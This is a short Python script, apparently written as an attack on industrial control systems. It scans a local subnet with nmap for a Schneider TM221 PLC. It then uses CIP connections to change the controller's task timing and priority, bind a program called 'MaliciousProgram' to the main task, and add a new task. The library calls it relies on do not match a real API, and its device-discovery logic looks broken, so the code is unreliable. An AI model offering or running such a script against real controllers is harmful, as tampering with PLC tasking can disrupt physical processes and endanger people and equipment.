import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def modify_controller_tasking(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the task to modify
        task_name = 'MainTask'
        
        # Use pycomm to modify the task
        cip_client.modify_task(task_name, 'interval', 100)
        cip_client.modify_task(task_name, 'frequency', 10)
        cip_client.modify_task(task_name, 'priority', 1)
        
        print(f"Task '{task_name}' modified on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to modify task: {e}")

def associate_program_with_task(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the program to associate with the task
        program_name = 'MaliciousProgram'
        task_name = 'MainTask'
        
        # Use pycomm to associate the program with the task
        cip_client.associate_program_with_task(program_name, task_name)
        
        print(f"Program '{program_name}' associated with task '{task_name}' on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to associate program with task: {e}")

def create_new_task_association(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the new task association
        task_name = 'NewTask'
        program_name = 'MaliciousProgram'
        
        # Use pycomm to create the new task association
        cip_client.create_task_association(task_name, program_name)
        
        print(f"New task association '{task_name}' created on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to create new task association: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Modify the controller tasking
        modify_controller_tasking(plc_ip)
        
        # Associate a program with a task
        associate_program_with_task(plc_ip)
        
        # Create a new task association
        create_new_task_association(plc_ip)
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()